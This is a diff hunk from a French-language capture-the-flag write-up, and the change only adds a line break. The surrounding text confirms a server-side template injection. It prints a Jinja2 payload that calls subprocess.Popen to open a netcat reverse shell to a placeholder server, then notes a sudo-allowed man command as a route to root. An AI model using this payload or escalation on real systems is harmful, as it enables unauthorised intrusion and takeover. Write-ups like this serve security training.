@@ -34,7 +34,7 @@ Interceptons cette fois-ci la requête avec burp suite pour directement modifier
 Le serveur nous répond : "Your file 49 will be review soon, thanks!", il est donc vulnérable.
 
 Je vous épargne la recherche de la classe subprocess.Popen qui est longue et fastidieuse, au final, la payload pour exécuter du code est :<br/>
-{{().__class__.__mro__[1].__subclasses__()[94]('nc <YOUR_SERVER> <PORT> -e /bin/bash',shell=True,stdout=-1).communicate()}}
+{{().__class__.__mro__[1].__subclasses__()[94]('nc <YOUR_SERVER> <PORT> -e /bin/bash',shell=True,stdout=-1).communicate()}}<br/>
 Super, allons lire le fichier /flag.txt! Et là, c'est le drame, le fichier est owned par root et nous n'avons pas les droits de lecture..
 
 Executons la commande "sudo -l" pour voir quelle potentielle commande nous aurons le droit d'exécuter sans mot de passe, bim, la commande man peut etre lancée en tant que root sans mot de passe!<br/>
